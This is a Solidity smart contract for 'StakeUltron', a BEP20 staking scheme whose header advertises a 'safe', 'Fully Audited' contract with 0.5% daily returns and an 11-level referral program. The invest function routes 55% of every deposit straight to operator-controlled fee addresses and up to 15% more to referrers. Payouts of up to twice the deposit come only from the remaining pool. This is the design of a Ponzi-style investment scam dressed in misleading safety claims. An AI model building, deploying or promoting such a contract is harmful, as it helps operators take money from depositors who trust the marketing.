/*  StakeUltron is the perfect combination of Digital Technology, High Security and Community Program
 *   Safe and decentralized. The Smart Contract source is verified and available to everyone.
 *
 *   
 *              Website: https://ultron.stakebnb.org 
 *
 *                StakeUltron SMART CONTRACT 
 *                
 *         Build from the Community for the Community. We support ULX.
 *				 
 *	 	       0.5% Daily ROI 						       	 
 *	                                                                        
 *                 Fully Audited Smart Contract 
 *
 *     			      [USAGE INSTRUCTION]
 *
 *  1) Connect Smart Chain (BEP20) browser extension MetaMask , or Mobile Wallet Apps like Trust Wallet  / Klever
 *  2) Ask your sponsor for Referral link and contribute to the contract.
 *
 *   [AFFILIATE PROGRAM]
 *
 *    15% in  11-level Referral Commission: 10% - 2% - 1% - 0.5% - 0.4% - 0.3% - 0.2% - 0.1% - 0.1% - 0.1% - 0.1% 
 *    
 *  [DISCLAIMER]: This is an experimental community project, which means this project has high risks and high rewards.
 *  Once the contract balance drops to zero, all the payments will stop immediately. This project is decentralized and therefore it belongs to the community.
 *   Make a deposit at your own risk.
 *
 */

//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}
contract StakeUltron {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;
    uint256 constant public DEPOSITS_MAX = 300;
    uint256 constant public INVEST_MIN_AMOUNT = 10 ether;
    uint256 constant public INVEST_MAX_AMOUNT = 4000000 ether;
    uint256 constant public BASE_PERCENT = 50;
    uint256[] public REFERRAL_PERCENTS = [1000, 200, 100, 50, 40, 30, 20, 10, 10, 10, 10];
    uint256 constant public MARKETING_FEE = 2500; 
    uint256 constant public PROJECT_FEE = 1000;
    uint256 constant public ADMIN_FEE = 1500;
	uint256 constant public NETWORK = 300;
    uint256 constant public Dev_Fee  = 200;
    uint256 constant public WITHDRAWAL_FEE = 200;

    uint256 constant public MAX_CONTRACT_PERCENT = 100;
    uint256 constant public MAX_LEADER_PERCENT = 50;
    uint256 constant public MAX_HOLD_PERCENT = 5;
    uint256 constant public MAX_COMMUNITY_PERCENT = 50;
    uint256 constant public PERCENTS_DIVIDER = 10000;
    uint256 constant public CONTRACT_BALANCE_STEP = 100000000 ether;
    uint256 constant public LEADER_BONUS_STEP = 100000000  ether;
    uint256 constant public COMMUNITY_BONUS_STEP = 10000000;
    uint256 constant public TIME_STEP = 1 days;
    uint256 public totalInvested;
    address public marketingAddress;
    address public projectAddress;
    address public adminAddress;
	address public networkAddress;
    address public devAdress;
    address public defaultAddress;
    address public withdrawalFeeAddress1;
    address public withdrawalFeeAddress2;

    uint256 public totalDeposits;
    uint256 public totalWithdrawn;
    uint256 public contractPercent;
    uint256 public contractCreationTime;
    uint256 public totalRefBonus;

    address public contractAddress;
    
    struct Deposit {
        uint256 amount;
        uint256 withdrawn;
        // uint256 refback;
        uint256 start;
    }
    struct User {
        Deposit[] deposits;
        uint256 checkpoint;
        address referrer;
        uint256 bonus;
        uint24[11] refs;
        // uint16 rbackPercent;
    }
    mapping (address => User) internal users;
    mapping (uint256 => uint) internal turnover;
    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event RefBack(address indexed referrer, address indexed referral, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address marketingAddr, address projectAddr, address adminAddr, address networkAddr,address devAddr,address _defaultReferral, address _withdrawalFee1,address _withdrawalFee2,address _contractAddress) {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        adminAddress = adminAddr;
		networkAddress = networkAddr;
        devAdress = devAddr  ;
        defaultAddress = _defaultReferral;
        withdrawalFeeAddress1 = _withdrawalFee1;
        withdrawalFeeAddress2 = _withdrawalFee2;
        contractCreationTime = block.timestamp;
        contractAddress = _contractAddress;
        contractPercent = getContractBalanceRate();
        
    }

    // function setRefback(uint16 rbackPercent) public {
    //     require(rbackPercent <= 10000);

    //     User storage user = users[msg.sender];

    //     if (user.deposits.length > 0) {
    //         user.rbackPercent = rbackPercent;
    //     }
    // }

    function getContractBalance() public view returns (uint256) {
        return IERC20(contractAddress).balanceOf(address(this));
    }

    function getContractBalanceRate() public view returns (uint256) {
        uint256 contractBalance = IERC20(contractAddress).balanceOf(address(this));
        uint256 contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(20));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }
    
    function getLeaderBonusRate() public view returns (uint256) {
        uint256 leaderBonusPercent = totalRefBonus.div(LEADER_BONUS_STEP).mul(10);

        if (leaderBonusPercent < MAX_LEADER_PERCENT) {
            return leaderBonusPercent;
        } else {
            return MAX_LEADER_PERCENT;
        }
    }
    
    function getCommunityBonusRate() public view returns (uint256) {
        uint256 communityBonusRate = totalDeposits.div(COMMUNITY_BONUS_STEP).mul(10);

        if (communityBonusRate < MAX_COMMUNITY_PERCENT) {
            return communityBonusRate;
        } else {
            return MAX_COMMUNITY_PERCENT;
        }
    }
    
    function withdraw() public {
        User storage user = users[msg.sender];

        uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 communityBonus = getCommunityBonusRate();
		uint256 leaderbonus = getLeaderBonusRate();

        uint256 totalAmount;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {

            if (uint256(user.deposits[i].withdrawn) < uint256(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint256(user.deposits[i].withdrawn).add(dividends) > uint256(user.deposits[i].amount).mul(2)) {
                    dividends = (uint256(user.deposits[i].amount).mul(2)).sub(uint256(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint256(uint256(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint256 contractBalance =  IERC20(contractAddress).balanceOf(address(this));
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
        // if (msgValue > availableLimit) {
        //     msg.sender.transfer(msgValue.sub(availableLimit));
        //     msgValue = availableLimit;
        // }

        // uint halfDayTurnover = turnover[getCurrentHalfDay()];
        // uint halfDayLimit = getCurrentDayLimit();

        // if (INVEST_MIN_AMOUNT.add(msgValue).add(halfDayTurnover) < halfDayLimit) {
        //     turnover[getCurrentHalfDay()] = halfDayTurnover.add(msgValue);
        // } else {
        //     turnover[getCurrentHalfDay()] = halfDayLimit;
        // }

        user.checkpoint = uint256(block.timestamp);
        uint256 withdrawalFee = totalAmount.mul(WITHDRAWAL_FEE).div(PERCENTS_DIVIDER);

        IERC20(contractAddress).safeTransfer(withdrawalFeeAddress1,withdrawalFee);
        IERC20(contractAddress).safeTransfer(withdrawalFeeAddress2,withdrawalFee);

        IERC20(contractAddress).safeTransfer(msg.sender,totalAmount);

        totalWithdrawn = totalWithdrawn.add(totalAmount);


        emit Withdrawn(msg.sender, totalAmount);
    }

    function getUserPercentRate(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint256 timeMultiplier = (block.timestamp.sub(uint256(user.checkpoint))).div(TIME_STEP).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 userPercentRate = getUserPercentRate(userAddress);
		uint256 communityBonus = getCommunityBonusRate();
		uint256 leaderbonus = getLeaderBonusRate();

        uint256 totalDividends;
        uint256 dividends;

        for (uint256 i = 0; i < user.deposits.length; i++) {

            if (uint256(user.deposits[i].withdrawn) < uint256(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint256(user.deposits[i].amount).mul(userPercentRate+communityBonus+leaderbonus).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint256(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint256(user.deposits[i].withdrawn).add(dividends) > uint256(user.deposits[i].amount).mul(2)) {
                    dividends = (uint256(user.deposits[i].amount).mul(2)).sub(uint256(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }
    
    function invest(uint256 _amount,address referrer) public {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(_amount >= INVEST_MIN_AMOUNT && _amount <= INVEST_MAX_AMOUNT, "Bad Deposit");

        IERC20(contractAddress).safeTransferFrom(msg.sender,address(this),_amount);

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 300 deposits from address");

        // uint availableLimit = getCurrentHalfDayAvailable();
        // require(availableLimit > 0, "Deposit limit exceed");

        uint256 msgValue = _amount;

        // if (msgValue > availableLimit) {
        //     msg.sender.transfer(msgValue.sub(availableLimit));
        //     msgValue = availableLimit;
        // }

        // uint halfDayTurnover = turnover[getCurrentHalfDay()];
        // uint halfDayLimit = getCurrentDayLimit();

        // if (INVEST_MIN_AMOUNT.add(msgValue).add(halfDayTurnover) < halfDayLimit) {
        //     turnover[getCurrentHalfDay()] = halfDayTurnover.add(msgValue);
        // } else {
        //     turnover[getCurrentHalfDay()] = halfDayLimit;
        // }

        uint256 marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint256 projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);
		uint256 adminFee = msgValue.mul(ADMIN_FEE).div(PERCENTS_DIVIDER);
		uint256 network = msgValue.mul(NETWORK).div(PERCENTS_DIVIDER);
        uint256 devfee = msgValue.mul(Dev_Fee).div(PERCENTS_DIVIDER);

        IERC20(contractAddress).safeTransfer(marketingAddress,marketingFee);
        IERC20(contractAddress).safeTransfer(projectAddress,projectFee);
        IERC20(contractAddress).safeTransfer(adminAddress,adminFee);
        IERC20(contractAddress).safeTransfer(networkAddress,network);
        IERC20(contractAddress).safeTransfer(devAdress,devfee);


        emit FeePayed(msg.sender, marketingFee.add(projectFee).add(network).add(devfee));

        if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
            user.referrer = referrer;
        }
        // else{
        //     user.referrer = defaultAddress;
        // }
        
        // uint refbackAmount;
        if (user.referrer != address(0)) {

            address upline = user.referrer;
            for (uint256 i = 0; i < 11; i++) {
                if (upline != address(0)) {
                    uint256 amount = msgValue.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);

                    // }

                    if (amount > 0) {
                        IERC20(contractAddress).safeTransfer(address(uint160(upline)),amount);
                        users[upline].bonus = uint256(uint256(users[upline].bonus).add(amount));
                        
                        totalRefBonus = totalRefBonus.add(amount);
                        emit RefBonus(upline, msg.sender, i, amount);
                    }

                    users[upline].refs[i]++;
                    upline = users[upline].referrer;
                } else break;
            }

        }

        if (user.deposits.length == 0) {
            user.checkpoint = uint256(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint256(msgValue), 0, uint256(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint256 contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msgValue);
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint256(user.deposits[user.deposits.length-1].withdrawn) < uint256(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint256) {
        return users[userAddress].deposits.length;
    }
    
    function getUserLastDeposit(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];
        return user.checkpoint;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint256(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
        User storage user = users[userAddress];

        uint256 amount = user.bonus;

        for (uint256 i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint256(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getCurrentHalfDay() public view returns (uint256) {
        return (block.timestamp.sub(contractCreationTime)).div(TIME_STEP.div(2));
    }

    // function getCurrentDayLimit() public view returns (uint) {
    //     uint limit;

    //     uint currentDay = (block.timestamp.sub(contractCreation)).div(TIME_STEP);

    //     if (currentDay == 0) {
    //         limit = DAY_LIMIT_STEPS[0];
    //     } else if (currentDay == 1) {
    //         limit = DAY_LIMIT_STEPS[1];
    //     } else if (currentDay >= 2 && currentDay <= 5) {
    //         limit = DAY_LIMIT_STEPS[1].mul(currentDay);
    //     } else if (currentDay >= 6 && currentDay <= 19) {
    //         limit = DAY_LIMIT_STEPS[2].mul(currentDay.sub(3));
    //     } else if (currentDay >= 20 && currentDay <= 49) {
    //         limit = DAY_LIMIT_STEPS[3].mul(currentDay.sub(11));
    //     } else if (currentDay >= 50) {
    //         limit = DAY_LIMIT_STEPS[4].mul(currentDay.sub(30));
    //     }

    //     return limit;
    // }

    function getCurrentHalfDayTurnover() public view returns (uint256) {
        return turnover[getCurrentHalfDay()];
    }

    // function getCurrentHalfDayAvailable() public view returns (uint) {
    //     return getCurrentDayLimit().sub(getCurrentHalfDayTurnover());
    // }

    function getUserDeposits(address userAddress, uint256 last, uint256 first) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory) {
        User storage user = users[userAddress];

        uint256 count = first.sub(last);
        if (count > user.deposits.length) {
            count = user.deposits.length;
        }

        uint256[] memory amount = new uint256[](count);
        uint256[] memory withdrawn = new uint256[](count);
        uint256[] memory refback = new uint256[](count);
        uint256[] memory start = new uint256[](count);

        uint256 index = 0;
        for (uint256 i = first; i > last; i--) {
            amount[index] = uint256(user.deposits[i-1].amount);
            withdrawn[index] = uint256(user.deposits[i-1].withdrawn);
            // refback[index] = uint(user.deposits[i-1].refback);
            start[index] = uint256(user.deposits[i-1].start);
            index++;
        }

        return (amount, withdrawn, refback, start);
    }

    function getSiteStats() public view returns (uint256, uint256, uint256, uint256) {
        return (totalInvested, totalDeposits, IERC20(contractAddress).balanceOf(address(this)), contractPercent);
    }

    function getUserStats(address userAddress) public view returns (uint256, uint256, uint256, uint256, uint256) {
        uint256 userPerc = getUserPercentRate(userAddress);
        uint256 userAvailable = getUserAvailable(userAddress);
        uint256 userDepsTotal = getUserTotalDeposits(userAddress);
        uint256 userDeposits = getUserAmountOfDeposits(userAddress);
        uint256 userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

    function getUserReferralsStats(address userAddress) public view returns (address, uint256, uint24[11] memory) {
        User storage user = users[userAddress];

        return (user.referrer, user.bonus, user.refs);
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}